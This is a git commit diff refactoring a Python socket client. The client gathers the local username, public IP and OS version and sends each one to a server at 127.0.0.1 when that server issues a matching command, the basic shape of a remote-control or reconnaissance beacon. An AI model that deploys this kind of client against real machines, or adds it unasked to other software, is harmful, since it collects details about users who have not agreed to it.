85b38d019cc414eb3110f625e24bc9a7a4f96b48
Jake Peach <112898008+4b3j@users.noreply.github.com>
2022-09-27 11:19:46 -0700

    Update client.py

--- client.py
+++ client.py
@@ -1,3 +1,5 @@
+from glob import glob
+from lib2to3.pytree import convert
 import os
 import requests
 import json
@@ -8,55 +10,62 @@ import socket
 import getpass
 import subprocess
 
-
-in_socket = socket.socket(socket.AF_INET)
-
+# Gets username l
 user = getpass.getuser()
 
+# Gets the users IP
 user_ip = requests.get("https://icanhazip.com").text
 
+# Gets the OS and version and combines them
 theOs     =    platform.system()
 theOsVer  =    platform.version()
 theOsSt   =    theOs + " " + theOsVer
 
+# Server information
+global SERVER_IP 
+global SERVER_PORT
 
-SERVER_IP    =  ""
-SERVER_PORT  =  3334
-
-
-def connect_to_server(ip, port):
-    try: 
-        int(port) 
-    except TypeError:
-        print(f"Port should be int not {type(port)}")
-        os._exit(1)
-    
-    try:
-      in_socket.connect((ip, port))
-    except ConnectionRefusedError:
-      print("Server has refused connection")
-    except OSError:
-      print("Invalid connection")
+class ClientSetup:
+    # Declaring socket using INET IPv4 and TCP too
+    def __init__(self):
+        self.in_socket:socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connect_to_server()
     
 
-    while True:
-        cmd = in_socket.recv(1024).decode("UTF-8")
+    def convert_byte(data:str):
+        return bytes(data, "UTF-8")
 
-        if cmd == "TEST":
-            in_socket.send(bytes("CONNECTED", "UTF-8"))
-        if cmd == "user":
-            in_socket.send(bytes(f"Username {user}", "UTF-8"))
-        if cmd == "ip":
-            in_socket.send(bytes(f"IP {user_ip}", "UTF-8"))
-        if cmd == "osIn":
-            in_socket.send(bytes(f"Platform {theOsSt}", "UTF-8"))
-        if cmd == "check":
-            in_socket.send(bytes("checked", "UTF-8"))
-        if cmd == "close":
-            in_socket.close()
-            break
+
+    def connect_to_server(self):
+        # Connect to the server
+        ip          = SERVER_IP
+        port:int    = SERVER_PORT
+        try:
+            self.in_socket.connect((ip, port))
+        except ConnectionRefusedError:
+            print("Server down")
+            os._exit(1)
+
+        while True:
+            cmd = self.in_socket.recv(1024).decode("UTF-8")
+
+            if cmd == "TEST":
+                self.in_socket.send(ClientSetup.convert_byte("CONNECTED"))
+            if cmd == "user":
+                self.in_socket.send(ClientSetup.convert_byte(f"Username {user}"))
+            if cmd == "ip":
+                self.in_socket.send(ClientSetup.convert_byte(f"IP {user_ip}"))
+            if cmd == "osIn":
+                self.in_socket.send(ClientSetup.convert_byte(f"Platform {theOsSt}"))
+            if cmd == "check":
+                self.in_socket.send(ClientSetup.convert_byte("checked"))
+            if cmd == "close":
+                self.in_socket.close()
+                break
             
 
 
 if __name__ == "__main__":
-    connect_to_server(SERVER_IP, SERVER_PORT)
+    SERVER_IP = "127.0.0.1"
+    SERVER_PORT = 3334
+    ClientSetup()
